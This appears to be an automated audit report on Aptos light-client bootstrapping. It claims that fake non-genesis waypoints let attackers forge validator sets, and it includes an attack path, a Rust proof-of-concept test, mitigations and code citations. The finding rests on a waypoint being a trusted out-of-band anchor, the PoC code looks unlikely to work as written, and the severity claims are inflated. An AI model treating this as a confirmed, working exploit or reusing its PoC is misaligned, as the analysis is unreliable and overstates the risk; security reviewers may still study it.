# Audit Report

## Title
Light Client Bootstrap Vulnerability: Unvalidated Non-Genesis Waypoints Enable Complete Blockchain State Forgery

## Summary
Light clients bootstrapping with non-genesis waypoints accept validator sets without cryptographic validation, allowing attackers to create entirely fabricated blockchain views by providing fake waypoints. The `try_from_epoch_change_li()` function and waypoint-based bootstrapping flow extract validator sets from ledger infos without signature verification when starting from an epoch waypoint trust anchor.

## Finding Description

The vulnerability exists in the light client trust establishment mechanism, specifically in how validator sets are accepted when bootstrapping with waypoints.

**The `try_from_epoch_change_li()` function** creates a trusted state by extracting the epoch state directly from a ledger info without any signature verification: [1](#0-0) 

This function only verifies accumulator consistency but does NOT validate signatures on the ledger info, allowing any validator set to be accepted if the accumulator matches.

**In the waypoint-based bootstrap flow**, when a light client starts with `TrustedState::EpochWaypoint`, the security model fundamentally breaks down for non-genesis waypoints: [2](#0-1) 

The `Waypoint::verify()` method only checks version and hash matching - it performs NO signature verification. When an epoch change proof is verified starting from a waypoint: [3](#0-2) 

The first ledger info is verified using the waypoint verifier (which only checks hashes), and then the next epoch state (validator set) is extracted without ever validating signatures.

**Attack Path:**

1. Attacker creates a fake genesis transaction with fake validators controlled by the attacker
2. Attacker computes a fake waypoint from this fake genesis (version 0 or higher)
3. Attacker distributes this fake waypoint to victims via:
   - Phishing (fake wallet setup guides)
   - MITM attacks on waypoint distribution
   - Compromised wallet software
   - Malicious documentation/tutorials
4. Victim's light client calls `TrustedState::from_epoch_waypoint(fake_waypoint)`
5. Attacker provides epoch change proofs with ledger infos matching the fake waypoint
6. Light client verifies only hash/version match via `Waypoint::verify()`, NOT signatures
7. Light client extracts fake validator set from the unverified ledger info
8. All subsequent ledger infos are "verified" using the fake validator set controlled by attacker
9. Attacker now controls victim's complete view of blockchain state

**Broken Invariants:**
- **Cryptographic Correctness**: Validator sets are accepted without BLS signature verification
- **Consensus Safety**: Light client sees a fake blockchain that violates actual consensus
- **State Consistency**: Light client's state diverges completely from the real blockchain

While genesis waypoints are hardcoded for mainnet/testnet: [4](#0-3) 

There is NO mechanism to validate non-genesis waypoints used for fast-sync scenarios, and no validation exists in the protocol to prevent fake waypoints from being accepted.

## Impact Explanation

**Critical Severity** - This vulnerability enables complete compromise of light client security:

1. **Loss of Funds**: Users can lose funds by:
   - Sending transactions to attacker-controlled addresses shown as legitimate
   - Accepting fake payment confirmations for goods/services
   - Trusting fake wallet balances before making decisions

2. **Consensus/Safety Violation**: From the light client's perspective, all consensus guarantees are violated - it operates on a completely fake blockchain

3. **Total Security Bypass**: All cryptographic protections are bypassed since the light client never verifies the initial validator set

4. **Widespread Impact**: Any light client implementation (mobile wallets, browser extensions, IoT devices) using non-genesis waypoints for fast-sync is vulnerable

This meets the **Critical Severity** criteria of "Loss of Funds" and "Consensus/Safety violations" with potential impact up to $1,000,000 per the Aptos bug bounty program.

## Likelihood Explanation

**Medium to High Likelihood** depending on waypoint distribution mechanism:

**High Likelihood Scenarios:**
- Wallet apps fetching waypoints from HTTP endpoints (MITM vulnerable)
- Users manually entering waypoints from untrusted sources
- Third-party wallet software with malicious waypoint hardcoded
- Phishing attacks targeting new users during wallet setup

**Medium Likelihood Scenarios:**
- Waypoints fetched from HTTPS endpoints (still vulnerable to DNS poisoning, server compromise)
- Supply chain attacks on wallet distribution channels

**Lower Risk (but still possible):**
- Hardcoded waypoints in official apps updated via app stores (requires compromising distribution)

**Attacker Requirements:**
- Ability to provide fake waypoint to victim (social engineering, MITM, malicious software)
- Infrastructure to serve fake blockchain data matching the fake waypoint
- No validator consensus or stake required

The attack is **realistic** because waypoint distribution is a weak point - unlike genesis waypoints which are hardcoded, non-genesis waypoints for fast-sync must be dynamically obtained, creating an attack surface.

## Recommendation

**Immediate Mitigations:**

1. **Restrict Light Client Bootstrapping**: Only allow genesis waypoint bootstrapping for light clients. Remove support for non-genesis waypoint bootstrapping in light client implementations.

2. **Multi-Source Waypoint Validation**: Implement waypoint consensus by requiring agreement from multiple independent sources:
   ```rust
   pub fn verify_waypoint_consensus(
       waypoint: Waypoint,
       trusted_sources: Vec<WaypointSource>,
       min_confirmations: usize,
   ) -> Result<()> {
       let confirmations = trusted_sources.iter()
           .filter(|source| source.get_waypoint() == waypoint)
           .count();
       ensure!(
           confirmations >= min_confirmations,
           "Waypoint not confirmed by sufficient sources"
       );
       Ok(())
   }
   ```

3. **Document Security Requirements**: Add clear documentation and runtime warnings:
   ```rust
   pub fn from_epoch_waypoint(epoch_waypoint: Waypoint) -> Self {
       if epoch_waypoint.version() != 0 {
           warn!("SECURITY WARNING: Using non-genesis waypoint. Ensure waypoint is obtained from TRUSTED source only!");
       }
       Self::EpochWaypoint(epoch_waypoint)
   }
   ```

4. **Waypoint Provenance Tracking**: Add metadata to track waypoint source:
   ```rust
   pub struct VerifiedWaypoint {
       waypoint: Waypoint,
       source: WaypointSource,
       verification_time: u64,
       verifier_signatures: Vec<Signature>, // Optional social verification
   }
   ```

**Long-term Solutions:**

1. Implement social verification protocols where waypoints can be cross-verified through multiple trust channels
2. Consider checkpoint-based systems where validators periodically sign waypoints
3. Use threshold signatures for waypoint attestation by validator set
4. Implement waypoint transparency logs similar to Certificate Transparency

## Proof of Concept

```rust
// Proof of Concept: Creating a fake light client with fabricated validator set

#[test]
fn test_fake_waypoint_bootstrap_attack() {
    use aptos_types::{
        trusted_state::TrustedState,
        waypoint::Waypoint,
        ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
        block_info::BlockInfo,
        epoch_state::EpochState,
        validator_verifier::ValidatorVerifier,
        aggregate_signature::AggregateSignature,
        epoch_change::EpochChangeProof,
    };
    use aptos_crypto::HashValue;
    use std::sync::Arc;

    // Step 1: Attacker creates fake validator set
    let (fake_signers, fake_verifier) = 
        aptos_types::validator_verifier::random_validator_verifier(4, None, true);
    let fake_validator_set = Arc::new(fake_verifier);
    
    // Step 2: Attacker creates fake epoch state
    let fake_epoch_state = EpochState {
        epoch: 1,
        verifier: fake_validator_set.clone(),
    };
    
    // Step 3: Attacker creates fake ledger info with fake validator set
    let fake_ledger_info = LedgerInfo::new(
        BlockInfo::new(
            0, // epoch
            0, // round
            HashValue::zero(),
            HashValue::random(),
            100, // version - fake waypoint version
            1000000,
            Some(fake_epoch_state.clone()),
        ),
        HashValue::zero(),
    );
    
    // Step 4: Attacker computes fake waypoint
    let fake_waypoint = Waypoint::new_epoch_boundary(&fake_ledger_info).unwrap();
    
    // Step 5: Victim light client starts with fake waypoint
    let victim_trusted_state = TrustedState::from_epoch_waypoint(fake_waypoint);
    
    // Step 6: Attacker provides fake epoch change proof signed by fake validators
    let fake_signatures = AggregateSignature::empty(); // In real attack, signed by fake validators
    let fake_ledger_info_with_sigs = LedgerInfoWithSignatures::new(
        fake_ledger_info,
        fake_signatures,
    );
    
    let fake_epoch_change_proof = EpochChangeProof::new(
        vec![fake_ledger_info_with_sigs.clone()],
        false,
    );
    
    // Step 7: Verify the fake proof passes (THIS IS THE VULNERABILITY)
    let result = victim_trusted_state.verify_and_ratchet_inner(
        &fake_ledger_info_with_sigs,
        &fake_epoch_change_proof,
    );
    
    // The verification succeeds because waypoint only checks hash, not signatures!
    // Now the victim trusts the fake validator set for all future verifications
    assert!(result.is_ok(), "Fake waypoint bootstrap should succeed - this is the vulnerability!");
    
    // Step 8: Victim now has compromised trusted state with fake validators
    if let Ok(change) = result {
        if let Some(new_state) = change.new_state() {
            // The new trusted state contains the fake validator set
            println!("VULNERABILITY: Light client now trusts fake validator set!");
            println!("Attacker controls victim's view of blockchain!");
        }
    }
}
```

**Notes**

This vulnerability is rooted in the waypoint trust model design where waypoints serve as out-of-band trust anchors. The codebase assumes waypoints are obtained from trusted sources but provides no mechanism to verify this assumption. While genesis waypoints are hardcoded and safe, the protocol allows non-genesis waypoints for fast-sync with no validation, creating a critical security gap for light client implementations.

The issue is particularly severe because:
1. Light clients are increasingly important for mobile wallets and resource-constrained devices
2. Users and developers may not understand the security implications of waypoint selection
3. No warnings or safeguards exist in the codebase to prevent fake waypoint usage
4. The attack requires no blockchain-level privileges - only the ability to influence waypoint distribution

### Citations

**File:** types/src/trusted_state.rs (L75-90)
```rust
    pub fn try_from_epoch_change_li(
        epoch_change_li: &LedgerInfo,
        accumulator: TransactionAccumulatorSummary,
    ) -> Result<Self> {
        // Ensure the accumulator and ledger info are at the same version/root hash.
        accumulator.verify_consistency(epoch_change_li)?;

        let epoch_state = epoch_change_li.next_epoch_state().cloned().ok_or_else(|| {
            format_err!("No EpochState in LedgerInfo; it must not be on an epoch boundary")
        })?;

        Ok(Self::EpochState {
            waypoint: Waypoint::new_epoch_boundary(epoch_change_li)?,
            epoch_state,
        })
    }
```

**File:** types/src/waypoint.rs (L62-79)
```rust
    pub fn verify(&self, ledger_info: &LedgerInfo) -> Result<()> {
        ensure!(
            ledger_info.version() == self.version(),
            "Waypoint version mismatch: waypoint version = {}, given version = {}",
            self.version(),
            ledger_info.version()
        );
        let converter = Ledger2WaypointConverter::new(ledger_info);
        ensure!(
            converter.hash() == self.value(),
            format!(
                "Waypoint value mismatch: waypoint value = {}, given value = {}",
                self.value().to_hex(),
                converter.hash().to_hex()
            )
        );
        Ok(())
    }
```

**File:** types/src/epoch_change.rs (L106-115)
```rust
            // Try to verify each (epoch -> epoch + 1) jump in the EpochChangeProof.
            verifier_ref.verify(ledger_info_with_sigs)?;
            // While the original verification could've been via waypoints,
            // all the next epoch changes are verified using the (already
            // trusted) validator sets.
            verifier_ref = ledger_info_with_sigs
                .ledger_info()
                .next_epoch_state()
                .ok_or_else(|| format_err!("LedgerInfo doesn't carry a ValidatorSet"))?;
        }
```

**File:** config/src/config/execution_config.rs (L25-28)
```rust
const MAINNET_GENESIS_WAYPOINT: &str =
    "0:6072b68a942aace147e0655c5704beaa255c84a7829baa4e72a500f1516584c4";
const TESTNET_GENESIS_WAYPOINT: &str =
    "0:4b56f15c1dcef7f9f3eb4b4798c0cba0f1caacc0d35f1c80ad9b7a21f1f8b454";
```
